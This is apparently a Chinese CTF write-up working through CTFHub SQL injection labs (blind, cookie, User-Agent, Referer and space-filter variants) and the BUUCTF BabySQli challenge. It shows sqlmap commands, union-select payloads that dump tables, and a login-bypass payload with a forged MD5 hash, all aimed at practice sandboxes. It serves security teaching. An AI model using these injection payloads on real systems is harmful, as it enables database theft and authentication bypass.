+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjYwODM1MGU3NmQ5ZDllMzNlMzc0ZDFjZGRjYWQ4OWVfaTJYTEFhTUZHb3ptMldoaXJucGYzVVFmYWN1ZDh0T2VfVG9rZW46T0dvc2Jvd0p1b3R2QVR4T0VZMGNVVXZFbmZnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>Sqlmap</p>
+<p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-64dd4ccf83da6564.sandbox.ctfhub.com:10800``/?id=1`` --dbs</span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-64dd4ccf83da6564.sandbox.ctfhub.com:10800``/?id=1`` -D sqli --tables</span><br></pre></td></tr></table></figure>
+
+<p>爆字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-64dd4ccf83da6564.sandbox.ctfhub.com:10800``/?id=1`` -D sqli -T flag --columns --dump </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NTM5NzNlMDFiNTI4NzUwYmM5NmE4OWRlNjMyNTNkZDNfRmtGaFluaEl3YVhWM0tzeGI4VVN2bTVXWlBDMG44T2xfVG9rZW46TUFmRWJNZjIyb2NmTjl4MlJTdGNSQkprbjZDXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NmVmMTA5Nzg2NjY0ZGRkZGQ1NzljMDBmNGI2MzNiMDRfa21iT2NhQ2VEZVlyakM5QmxEdUtsTWdsazNHNlBMMkJfVG9rZW46VTNvWmJxd1Vyb1JHY1R4OElwMGNWM2F1bnVmXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><blockquote>
+<p>sleep()语句，使数据库在暂停n秒之后再将搜索结果输出</p>
+<p>第一位为s时，程序睡眠5秒</p>
+<p>&#x2F;?id&#x3D;id((substr(database()),1,1)&#x3D;’s’,sleep(5),1)</p>
+</blockquote>
+<p>sqlmap</p>
+<p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u ``http://challenge-a5647696d00bf262.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T --dbs</span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-a5647696d00bf262.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T -D sqli --tables</span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-a5647696d00bf262.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T -D sqli -T flag --columns</span><br></pre></td></tr></table></figure>
+
+<p>爆字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-a5647696d00bf262.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T -D sqli -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OWU1NzIxOGQxNmExNjE0YzA4YzVkZDVmNmJiNDQ4YTlfazlHaUd2R3ZSc3A2YUVZMkEyRGxRZTI5bGRsMXJJRjZfVG9rZW46UUtlZ2JYdm9LbzdKVll4ODV6ZGNmczI0bmtmXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MGE4MWM1MDI0NDk2NzNlYjA2ZWM4MTEzMGQyN2VmNzRfbFdBS0tIdWdGeTdLMzM3OWIzd1B5bFIwcTE5T01MeWpfVG9rZW46QUM5ZmJXU05abzg4M3p4dWI1RGNjV0dVbnNmXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjAyY2E0YTVjYzBjMTgyNzYxMzlhMTlmMmNmNmRmNzFfbDhwVGdEM2xHRVhrWmNIcnVpMllzN25mbEhFMjNZZERfVG9rZW46VndzRmJ6YThxb2FLMjN4eUo2WmNJMnJQbk5oXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NjBjMDE4ODliODA0YmNiNTJkNGYwYmY4YzBjNDFiMTNfNzJNY2Q2UjQ4MmFlcXFJY0xIemc4dENhY1V1ejFoQjJfVG9rZW46SkFWRmJnZzJCb0liQkJ4SXgySWNuMlVubklnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h3><p>sqlmap</p>
+<p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u ``http://challenge-b18ebe43a13b3942.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T --dbs</span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-b18ebe43a13b3942.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T -D sqli --tables</span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-b18ebe43a13b3942.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T -D sqli -T ``muxzxvjuxp`` --columns</span><br></pre></td></tr></table></figure>
+
+<p>爆字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ``http://challenge-b18ebe43a13b3942.sandbox.ctfhub.com:10800/?id=1`` --batch --technique T -D sqli -T ``muxzxvjuxp``  -C ``jeajrznyhi`` --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGQ2YzdhODhmYTMwZjg3NDM4Yzg1MWVhZmI5Y2MxNzVfcDNyQlNJRzdvZmRrZ0t3djNUdFB5bkl2Mmo0Q1FEWHRfVG9rZW46S2tMZmJTSlhRb2ZDd0F4QnljdGNpUklrbkNoXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YTZhZmJlZDRjZWU3MzU4MzAxNTVmNTBjNDIzMWZmZjNfWnVXSWRMc1JJYXY5VTJUOGF4YXFXNnVza0dBcnJEMlJfVG9rZW46UFlWbmJ5TEkyb3ltZGh4d0VJOWNtY2VJbkRkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YjY1ZDlhNmQ1NGM0ZjYwNDlhMjljNGEzMGFkY2M3MGJfcHRnUVhaRU1XSlJTNjBHc0s5STl0NTBlS0g4UWRhUzdfVG9rZW46T3V3YWJleEljb1Z1SnF4YU5rT2N3QWF2blVjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OWM4ZjUyZDFmYTUxNDM5YmRhNzg4YjZjZDIxZjg0YTVfejlQYTQxVkJlQzh1aWdQRWZxUVBvSFdnTzZBaXBZRjhfVG9rZW46SVRFVmJ2V2p6b0k0Njd4YmVPS2N2QXhObkVFXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDg4ZmRlMWE0NjFmZmFkNjU1MzdjMjdmMTZiYTlmM2NfZ01sUFlOaGRuR0pLWnpaeTBDVFFIZE1td0xObTRYa2ZfVG9rZW46VENRVGJWb2Nlb3BOZm54c3hxaWNLdDBabjllXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>查看cookie值id&#x3D;1</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=M2ExYWQxY2M0ZjE5YjdhYjFjMGIwMWRhYzZkOWQ1ODdfZEY0TFg4RjlOYWFOOTN3TENUV1JhQWZqSzdOMmNKSnRfVG9rZW46WFQxcmJ1Uk1DbzFCSmF4MGVHeWNqVUZNbkFlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>burp，闭合方式</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ODA3MDI1OGRjYWQzNGUyODUyOTQzYTAzYjJjZGFjMzdfWk9nUWVKdlVCalQ3d3RnU0YzQU05b0pYdWwxVTg5RzdfVG9rZW46VVl2bWJoWno1bzVURW54cFZXZmMzVEtBblhnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>两个注入点</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NTk0MWJjYzU2MjkyMjM1MTVjZWQxZmZlOTU3NDU4MjVfVW1EbDNHYzBaZzNTYUNEem44c1V6cXIxb3RZNEtybElfVG9rZW46R1hyemI2ZFhvb1NOSm94cmNCOGNrSWhXbjBnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆库</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjM3NWZiZWRhYmI5ODE0NTdkOGE5NGNlNDM1YmMzODlfUFVNaWdKZUFTVEpVUWF4WnEwSUtDcUZpVW9BU09KTzRfVG9rZW46S3l1amJPRkZob29yWDN4ZVZ6RGMyazRJbnNnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆表</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=0x73716c69;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>表名：odcrkptpkb—&gt;0x6F6463726B7074706B62（16）</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NDM4MmFlNWIyMmNlM2Y0NTdlZTMwZDBhOWZiOWE2YjlfbU9VczRBZFhibmx4eWNnY3l3SkhWN25rTXpXWVYxcmVfVG9rZW46RjV3WWJZNW5Ib21qN3l4Q1pMZWNjV29DbjViXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:id=-1 union select 1,group_concat(column_name)from information_schema.columns where table_name=``0x6F6463726B7074706B62``;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>字段名：oyebhszoal</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA5MWY1OGViOTM2NTg1Y2MzY2YwNTUwOGE5OTkzNzRfMm9FRk5pTG5VV1hJYkZ2STVZb2NsRFRQaFNrTlhQZklfVG9rZW46TWNJZ2Jla1A5bzZJVHd4WGNScmNYWHJMbmlkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段值</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:id=-1 union select 1,``oyebhszoal`` from sqli.``odcrkptpkb``;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2I5MWQ1NmJiZjgwOTQ4NmZhYTliNTFmNmNkNTE3ZmNfTjRXQ2IySEFxR2Y3QlJRcjhTU2dlZjNqTUNOaVlmT2NfVG9rZW46WGVLdGJVRHE4bzlFZ0J4dW1ldmNHVmhkbmNnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h3><p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MWZkMzJkNmViMGJjNDRkNGY2YTRhMzE1Y2JjNzAyZjVfSEVlOTkyd1lIT1ZGQkNlOU1QTVVXSmZ6bkJwd2ZVdWlfVG9rZW46Q2V3d2JRU0xJb1lsWXV4RUxFNWNqdFhxbnhlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>闭合方式</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MDQ2OThkNzBlMjk0OWU3MDkyMWMwNTc3NmFlYWRhYWFfbHJCM3UxUzhwaGdsYkpjVUZKbWh6UWJhQWFqdHFYSTlfVG9rZW46SWdKcWJXcFowb2xoQ1F4ZUp5U2NvYXBxbjBnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>两个注入点</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MGYyMzMzNWNkZjZlZGI4MjNhZDI1NzY5MGJmNmJjNmRfVHdrRmZRTkJqRExJeURGcDFQTUhOekJZYk9NQ2U1eGxfVG9rZW46VXVqamJDUzZmb21rUlN4R1N2cmM1N0RlbnRFXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆库</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGQ3MmEzMjU0ZjgwNTVmZDQ1ZTQyNzhkODViYzA4MTlfTk52WHBiVzFPTm1ISEM4Z0VVc0cyM2tsNlczVUZ4alRfVG9rZW46QXdGQWJ2dkNLb0hGV2R4akJCcmN4bGNIbklnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆表</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=0x73716c69;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>表名：zvpnnzvzbk—&gt;0x7A76706E6E7A767A626B</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjk0YTViZmNmOTlmYTkzZDcwOGYyMWFhZTAyNDk0NTNfRXZxUEdyb01hNFBXYThEY1U3QUo5ZHF1bXUxbG42R0NfVG9rZW46RzFvUWJHTFF2b0syMUh4MktqZGNqVlM1bnpiXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: id=-1 union select 1,group_concat(column_name)from information_schema.columns where table_name=``0x7A76706E6E7A767A626B``;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>字段名：wekzupwwrm</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGUyZWVlMzJiNWE3ZmY2OTcyNDYyNjI0MjY0ZTdkYzdfZkRQUkZXOW1XMUFwNTg1ZGozQktJTXR1M3VGcWNERGJfVG9rZW46QnhYdWJ0YVNwb3FaNzd4RmVoZmNNb2wxbjViXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段值</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,``wekzupwwrm`` from sqli.``zvpnnzvzbk``;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGU0MTc4ZTgwYmNmMWFkMmNkNTg2OGRhYzY1MDE0NDFfakdySVAzczZyQjhIOFhCWEEweXREbFVMbzdVTGJ2R05fVG9rZW46U1dGdmJOeG5Db3Jwa0J4YXZoQmNmY3V4bjhkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h3><p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MjhmNWQ1Nzk2MjI0ZmExNGE3MGY1MjAwOWRkZWY4YjlfaEM4SWkwNFZLSExMNlRydXRqSDMyMUVUcTZDczJzWkhfVG9rZW46RlFCbGJtZ1BYb004d1J4RWo2cmNoY1o0blVjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆库</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQxMTU0NDBjOWIwZDk3NDVhODYxMzZmNTUwMTdjOGZfZVNkclhKY1E2RVc0ZkRaS2VBNjZCZ0VtbXdHWmZVODJfVG9rZW46SDhHWGJVaEd0bzIwaUV4cmhZOWMxZExWbkZjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆表名</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=0x73716c69;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>表名：thbgqcjpmz—&gt;0x7468626771636A706D7A</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NzIwMWQzNGIzNThiZTJjZjgzYTkzZjQwZjVkM2QzMGZfQUFHMmdzS3g2R2pYNWxYalBTeWZYTGQxeFJJNW0welVfVG9rZW46V0drM2JmZEhkb3BvUXN4eWVONmNJMVJVbmphXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段名</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: id=-1 union select 1,group_concat(column_name)from information_schema.columns where table_name=``0x7468626771636A706D7A``;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>字段名：abxxlmnvhe</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=N2VjZjJhMTE5YmRmOWNlY2JmZjIxMWI0ZTg3MTE0MDBfUUUwZjFKZFdJdzFPWG1xWGVXQ0R2U2tSUmpqRmgzYk5fVG9rZW46UGNKOGJySTBBb1RDRm54TW1OR2NsUHo4blpmXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段值</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,``abxxlmnvhe`` from sqli.``thbgqcjpmz``;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OThkOGIwYjRhYWM2MzJjMjJjNTkyNTc5ZDRmMDMyNjZfYmZKZUZDQlFVTDhwaTJqU1RyT1RZTzFyQzU5b3hoTkJfVG9rZW46VEM0WWIzR0xub09LdFB4YnZSZmMyUGN6bnJoXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>过滤了空格，用&#x2F;**&#x2F;代替空格</p>
+<p>闭合方式</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1/**/and/**/1=1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQzM2M3YTYzM2E3Nzc5ZjA0MTY1ZDAwMjY2NWQwYThfeTZCbFZpY3paVFBmakZVVnFIU0tlQVZuZUkxZ1RRMTVfVG9rZW46SWZsTmJRck00b0xUMzJ4M045MGNCOWtmbk5lXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆表</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=0x73716c69</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>表名：hbwrbefqzl—&gt;0x68627772626566717A6C</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTMwNzE2YTUyM2NiZTEyMDIzNDQ3MzQ4MDNiN2M3YTFfWWRLemlSNTdtSGJxcTZKWjFBUDN2dVNRa0FiaVpTNDFfVG9rZW46TnhkSGJlcDBBb1hLdnB4NzRqQ2M0ajVublFiXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=``0x68627772626566717A6C</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>字段名：cqvlzexoto</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTgwMDA2MTllODIzMWFlMTQxODdjMWM1ZDRjZTJkNDdfRnA0RTQxZnJaYWFmRElNMGdwVE9LNzdydlNUTHA0b2pfVG9rZW46QnZybWJ2T2w1b09WeXZ4MEpRemNEVTFtbndlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段值</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1/**/union/**/select/**/1,cqvlzexoto/**/from/**/sqli.hbwrbefqzl</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YjI4OWM2NWUxNDFmMDFlOGVkZDJjNzI0MTBmMDAyZTZfcVZob29VdEdaT2FCRXRRWG9CMlByTmM1UHRyZ1F1VGhfVG9rZW46VkZMYmIzUDJhb2JtQml4cm52aWNIbXpjbklnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>题目：</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQzZWNjZjg5M2Y5YTM5ODUxNjAyNTFmOGM5MGM0M2ZfMEx2Q3loOThwMlZvbVNRYmpuQmhFYldyR1FkYVJtelpfVG9rZW46Q3pxSmJ1ZTk3b05FQlN4Rjh3WGNySUpXbjRiXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NWRmZTRiMzVlOTEyOTQwNzBlMjRhZmJmYzY2MjQwOWFfNnR6dE9lV2xydnFjMlRFbEliQzJUNWp2c0VWT1lwUWNfVG9rZW46VWpmWWJ1VVI3b2lxMTZ4dGRMOWNtY0w4bmljXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>burp抓包，随便输入值，repeater放包</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM1NTA1Y2ZkMzkyNzhhNDBkNTg2NTUwYTcwZDIzMWJfMXhzMjZzRDdacDJiVHFReFhzZU82VWE5S0JEbHdoMDJfVG9rZW46R0ZITWJ3d1l3b2NEZTB4c2RmVGNFenZpbm5iXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>注释中发现某种编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGU5ZDVmMzY0MTU4MjM1M2MzZDcyMmNhNjk0MmIzOWJfUHFDMWh0V2VqMnJxMGVOSURDQnV4MTU3M2JMSlJSUktfVG9rZW46S2hqOWJaVWdCb0l4dk14ZzlyZGM3TWlhbjZlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>厨子一把梭<code>select * from user where username = &#39;$name&#39;</code></p>
+<p>第一步、这是一段SQL查询语句，判断出此题的注入点是参数name</p>
+<p>第二步、判断注入的类型</p>
+<blockquote>
+<p>1’</p>
+<p>1</p>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzRkY2NiZGQyZWU4YTA4NGUzZWE5MDQ4Y2E4OGQxZTVfM1E4ZjA0bXAwaDI5ZWs0b0Jhc2RNbTFCTGg5UktWcHZfVG9rZW46T1pIcmJtVmhib3l1M2h4SmhZUmNnbWV1blhjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>出现报错，为字符型？（and1&#x3D;1-&gt; do not hack me!）</p>
+<p>第三步、判断字段数（为3）</p>
+<p>命令<code>name=1&#39; UNION SELECT 1,2-- -&amp;pw=1</code></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTZhM2IwZGQwM2RhMzZlMjUzM2Y2MzQ2NmZmNDM5MTFfNndnQ3ZLYkpkUmhFanpOUDFKYm9IdGJhR2cwVmhrMTRfVG9rZW46VlhaY2JCeFhCb1FYdm94VG5rTmN1c1JTbjBiXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MjFhN2RmMTYxYjljYTg3NTI3ZTA2M2M5MWY5NDIwMzNfZFpGTFJXbzRHbHJNU2dtOXRWWG96S0hwR1gxZ014N0hfVG9rZW46THVoV2IyTlIzb0FJc3V4Z1ZQZWNJb00xbjljXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTVmYTNhNjU1ZTQ5YmJkZDAxOWI1OThkNjc5YWU3YmNfYW9kQ2tVUnlFdHZXV09WVWVZWDdYcDViZURJODJWTFNfVG9rZW46WDBreWJEajk4b3BWVVZ4aUJnbWNMVjVtbmdlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NTZlOWRmYjU2YjhhNmU4MjE1YTdmYjZiNTRiMjE2NzFfQmx1UVZpakxWb3owcnFXTjREckRnaTBOdEtyVVVkS3FfVG9rZW46WEo5bWJuclR4bzdhZ2J4cUx6aWM4VkVEbkZnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>第四步、应该是猜表名</p>
+<p>查看源代码，得知用户名&#x3D;admin</p>
+<p>并且password经过md5加密</p>
+<p>猜测username数据表中的三个字段为：flag、name、password</p>
+<p>password：123</p>
+<p>md5（1）：202cb962ac59075b964b07152d234b70</p>
+<p>构造payload：name&#x3D;1’union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw&#x3D;123</p>
